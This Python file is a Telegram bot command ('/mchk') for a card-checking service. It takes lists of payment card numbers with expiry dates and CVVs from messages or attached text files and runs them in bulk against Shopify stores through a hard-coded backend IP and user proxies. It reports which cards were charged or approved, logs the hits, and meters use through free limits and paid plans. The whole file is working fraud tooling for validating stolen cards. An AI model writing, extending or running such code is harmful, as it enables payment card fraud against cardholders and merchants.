"""Shopify direct-API gate - /mchk mass.

Powered by `commands.lib_shop_api.check_card` (direct call to 108.165.12.183:8081).
"""
import re

from aiogram import Router, Bot
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject
from aiogram.types import Message

import database.db as db
from config import OWNER_IDS, FREE_DAILY_LIMIT, OWNER_USERNAME
from functions.emojis import EMOJI
from functions.file_input import read_attached_txt
from functions.proxy_gate import get_user_proxy
from commands.lib_shop_api import check_card, extract_cards

router = Router()
_DEFAULT_SITE = "https://yourthreads.myshopify.com"
_CARD_RE = re.compile(r"(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})")


async def _is_priv(uid: int) -> bool:
    if uid in OWNER_IDS:
        return True
    return await db.is_admin(uid)


async def _can_check(uid: int) -> tuple[bool, str]:
    if await _is_priv(uid):
        return True, ""
    plan = await db.get_user_plan(uid)
    if plan["unlimited"]:
        return True, ""
    used = await db.get_daily_hits(uid)
    if used >= FREE_DAILY_LIMIT:
        return False, f"Daily free limit reached. Contact {OWNER_USERNAME}."
    return True, ""


def _normalise(card: str) -> str | None:
    m = _CARD_RE.search(card)
    if not m:
        return None
    n, mm, yy, cvv = m.groups()
    if len(yy) == 2:
        yy = "20" + yy
    return f"{n}|{mm.zfill(2)}|{yy}|{cvv}"


def _looks_like_url(s: str) -> bool:
    return s.startswith("http://") or s.startswith("https://")


@router.message(Command("mchk", prefix="/."))
async def cmd_mchk(msg: Message, command: CommandObject, bot: Bot):
    uid = msg.from_user.id
    if await db.is_banned(uid):
        await msg.answer(f"{EMOJI['ban']} You are banned.", parse_mode=ParseMode.HTML)
        return
    ok, why = await _can_check(uid)
    if not ok:
        await msg.answer(f"{EMOJI['lock']} {why}", parse_mode=ParseMode.HTML)
        return
    ok_p, proxy, err_p = await get_user_proxy(uid)
    if not ok_p:
        await msg.answer(err_p, parse_mode=ParseMode.HTML)
        return

    raw = (command.args or "").strip()
    site = _DEFAULT_SITE
    blob = raw
    if raw:
        first, *rest = raw.split(None, 1)
        if _looks_like_url(first):
            site = first
            blob = rest[0] if rest else ""
    if msg.reply_to_message and msg.reply_to_message.text:
        blob += "\n" + msg.reply_to_message.text

    txt_blob = await read_attached_txt(msg, bot)
    if txt_blob:
        blob += "\n" + txt_blob

    cards = extract_cards(blob)
    if not cards:
        await msg.answer(
            f"{EMOJI['question']} Usage:\n"
            f"<code>/mchk &lt;url&gt;\ncc|mm|yy|cvv\ncc|mm|yy|cvv</code>\n"
            f"…or attach / reply to a <code>.txt</code> file containing cards.",
            parse_mode=ParseMode.HTML,
        )
        return

    cap = 200 if txt_blob else 25
    cards = cards[:cap]
    is_priv = await _is_priv(uid)
    progress = await msg.answer(
        f"{EMOJI['hitting']} <b>Mass Shopify</b>\nQueued <code>{len(cards)}</code> on <code>{site[:40]}</code>…",
        parse_mode=ParseMode.HTML,
    )

    charged = approved = declined = err = 0
    lines: list[str] = []
    for idx, card in enumerate(cards, 1):
        try:
            result = await check_card(card, site, proxy)
        except Exception as e:
            result = {"status": "Site Error", "message": str(e)[:40]}

        st = result.get("status")
        m = (result.get("message") or "")[:50]
        if st == "Charged":
            charged += 1
            lines.append(f"{EMOJI['charged']} <code>{card}</code>")
            await db.log_check(uid, card, "", site, str(result.get("price", "?")), st, m, 0.0)
            await msg.answer(
                f"{EMOJI['charged']} <b>CHARGED</b>\n"
                f"<code>{card}</code>\n"
                f"Site: <code>{site[:60]}</code>\n"
                f"Price: <code>{result.get('price', '?')}</code>\n"
                f"Reply: <code>{m}</code>",
                parse_mode=ParseMode.HTML,
            )
        elif st == "Approved":
            approved += 1
            lines.append(f"{EMOJI['live']} <code>{card}</code> · {m}")
            await db.log_check(uid, card, "", site, str(result.get("price", "?")), st, m, 0.0)
            await msg.answer(
                f"{EMOJI['live']} <b>APPROVED</b>\n"
                f"<code>{card}</code>\n"
                f"Site: <code>{site[:60]}</code>\n"
                f"Reply: <code>{m}</code>",
                parse_mode=ParseMode.HTML,
            )
        elif st == "Site Error":
            err += 1
            lines.append(f"{EMOJI['risky']} <code>{card}</code> · site err")
        else:
            declined += 1
            lines.append(f"{EMOJI['declined']} <code>{card}</code>")

        if not is_priv:
            await db.increment_daily_hits(uid)

        body = "\n".join(lines[-12:])
        try:
            await progress.edit_text(
                f"{EMOJI['hitting']} <b>CHK {idx}/{len(cards)}</b>\n"
                f"{EMOJI['charged']} {charged} · {EMOJI['live']} {approved} · "
                f"{EMOJI['declined']} {declined} · {EMOJI['risky']} {err}\n"
                f"━━━━━━━━━━━━━━\n{body}",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    summary = (
        f"{EMOJI['stats']} <b>Shopify Mass Done</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"{EMOJI['charged']} Charged:  <code>{charged}</code>\n"
        f"{EMOJI['live']} Approved: <code>{approved}</code>\n"
        f"{EMOJI['declined']} Declined: <code>{declined}</code>\n"
        f"{EMOJI['risky']} Site Err: <code>{err}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<i>by {OWNER_USERNAME}</i>"
    )
    try:
        await progress.edit_text(summary, parse_mode=ParseMode.HTML)
    except Exception:
        await msg.answer(summary, parse_mode=ParseMode.HTML)
